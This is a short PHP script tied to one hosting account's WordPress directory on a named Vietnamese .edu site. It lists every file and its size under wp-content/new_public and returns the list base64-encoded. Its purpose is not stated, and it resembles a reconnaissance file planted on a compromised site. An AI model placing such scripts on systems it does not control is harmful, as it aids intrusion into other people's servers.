<?php
header('Content-Type: text/plain; charset=utf-8');

$dir = '/home/vhvxoigh/ideas.edu.vn/wp-content/new_public';
$results = [];

if (is_dir($dir)) {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $rel = str_replace('/home/vhvxoigh/ideas.edu.vn/', '', $file->getPathname());
            $results[] = [
                'path' => $rel,
                'size' => $file->getSize()
            ];
        }
    }
}

$json = json_encode($results);
$b64 = base64_encode($json);
echo chunk_split($b64, 76, "\n");
